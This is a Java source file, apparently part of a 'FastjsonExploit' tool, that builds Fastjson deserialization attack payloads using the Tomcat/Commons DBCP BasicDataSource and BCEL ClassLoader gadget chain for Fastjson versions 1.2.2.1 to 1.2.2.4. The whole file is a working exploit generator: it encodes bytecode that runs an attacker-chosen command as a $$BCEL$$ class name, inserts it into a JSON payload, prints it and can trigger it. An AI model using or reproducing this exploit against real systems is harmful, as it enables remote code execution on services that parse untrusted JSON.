@payloads.annotation.PayloadType({ payloads.annotation.PayloadType.LOCAL })
@payloads.annotation.VulVersion({ "1.2.2.1-1.2.2.4" })
@payloads.annotation.Dependencies({ "tomcat-dbcp:tomcat-dbcp:7.x", "tomcat-dbcp:tomcat-dbcp:9.x", "commons-dbcp:commons-dbcp:1.4" })
public class BasicDataSource2 implements payloads.ObjectPayload {
	@java.lang.Override
	public void process(java.lang.String[] args) {
		if ((args.length != 2) && (args.length != 3)) {
			java.lang.System.out.println("[*] Usage: java -jar FastjsonExploit-[version].jar BasicDataSource2 \"[cmd:xxx|code:xxx.java]\"");
			return;
		}
		try {
			java.lang.String command = args[1].trim();
			util.JarFileReader jsr = new util.JarFileReader();
			java.lang.String payload = jsr.read("BasicDataSource2.tpl");
			byte[] byteCode = gadget.Gadget.getBasicDataSource1ExpCode(command);
			java.lang.String classname = com.sun.org.apache.bcel.internal.classfile.Utility.encode(byteCode, true);
			classname = "$$BCEL$$" + classname;
			payload = payload.replace("###EVIL_CODE###", classname);
			java.lang.System.out.println("[*] payload build success!");
			java.lang.System.out.println(("\n" + payload) + "\n");
			if ((args.length == 3) && args[2].equals("-exec")) {
				java.lang.System.out.println("[*] Try local parsing");
				com.alibaba.fastjson.JSON.parseObject(payload);
			}
		} catch (java.lang.Exception e) {
			e.printStackTrace();
		}
	}

	public static void main(java.lang.String[] args) {
		if ((args.length != 1) && (args.length != 2)) {
			java.lang.System.out.println("[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.BasicDataSource2 <rmi/ldap address>");
			return;
		}
		java.lang.String command = args[0].trim();
		java.lang.System.out.println(command);
		try {
			java.lang.String payload2 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
			payload2 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
			byte[] byteCode = gadget.Gadget.getBasicDataSource1ExpCode(command);
			java.lang.String classname = com.sun.org.apache.bcel.internal.classfile.Utility.encode(byteCode, true);
			classname = "$$BCEL$$" + classname;
			payload2 = payload2.replace("xxxxxxxxxx", classname);
			java.lang.System.out.println(payload2);
			if ((args.length == 2) && args[1].equals("-exec")) {
				java.lang.System.out.println("[*] Try local parsing");
				com.alibaba.fastjson.JSON.parseObject(payload2);
			}
		} catch (java.lang.Exception e) {
			e.printStackTrace();
		}
	}
}